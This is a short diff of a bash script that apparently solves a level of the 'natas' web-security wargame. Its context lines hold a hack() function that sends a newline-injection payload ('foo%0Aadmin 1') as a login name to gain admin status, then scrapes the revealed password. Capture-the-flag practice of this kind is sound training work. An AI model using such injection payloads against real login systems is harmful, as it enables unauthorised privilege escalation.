@@ -1,4 +1,5 @@
 #!/bin/bash
+. ../natas.sh
 function hack() {
 	session_id=$(request-login "foo%0Aadmin 1" 2>&1 | grep -Po "(?<=\s)[\w\d]{26}(?=\s)")
 	password=$(request "$session_id" 2>&1 | grep -Po "(?<=Password:\s)[\d\w]+")
